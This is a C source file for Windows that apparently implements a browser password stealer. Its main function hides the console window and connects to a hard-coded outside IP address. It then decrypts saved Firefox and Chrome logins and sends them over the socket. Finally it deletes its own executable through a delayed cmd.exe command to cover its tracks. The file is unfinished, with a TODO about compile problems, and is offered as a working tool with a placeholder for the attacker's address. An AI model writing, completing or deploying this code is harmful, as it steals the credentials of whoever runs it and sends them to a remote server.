#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <strsafe.h>

#include <shlobj.h>
#include <objbase.h>
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib,"kernal32.lib")

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

#include "firefox.h"
#include "chrome.h"
#include "aes.h"
#include "quickmail.h"

#define _WIN32_WINNT 0x0500
    
int startWinsock(void)
{
  WSADATA wsa;
  return WSAStartup(MAKEWORD(2,0),&wsa);
}

int createSocket(){
    int sock = socket(AF_INET,SOCK_STREAM,0);
    return sock;
}

int connectSocket(int socket,const struct sockaddr_in *addr,int addrlen){
    int connSocket = connect(socket, addr, addrlen);
    return connSocket;
}

void DelMe()
{
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
int main(){

    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_HIDE );

    SOCKET s;
    startWinsock();

    struct sockaddr_in saServer;
    struct AES_ctx blob;


    char ip[] = {'8','1','.','1','6','9','.','1','3','6','.','2','1','1'};
    memset(&saServer, 0, sizeof(saServer));
    saServer.sin_family = AF_INET;
    saServer.sin_addr.s_addr = inet_addr(ip); //here goes your addr! 
    saServer.sin_port = htons(20); 

    s = createSocket();
    if(s==INVALID_SOCKET){
         DelMe();
    }
    SOCKET connSocket = connectSocket(s,(const struct sockaddr * )&saServer,sizeof(saServer));
    if(connSocket == INVALID_SOCKET){
        closesocket(s);
        DelMe();
    }
    //send database and logins.json
    //decrypt firefox database -> send data to server
    char decryptedData;
    int size = dump_firefox_passwords(&decryptedData,s); //TODO LPSTR in Char array!!!!!!!!!!!!!!!!!!!! and fix compilying problems!

    dump_chrome_passwords(s);

   
    //decrypt chrome database -> send data to server 
    //close all
    closesocket(s);
    closesocket(connSocket);
    DelMe();
}
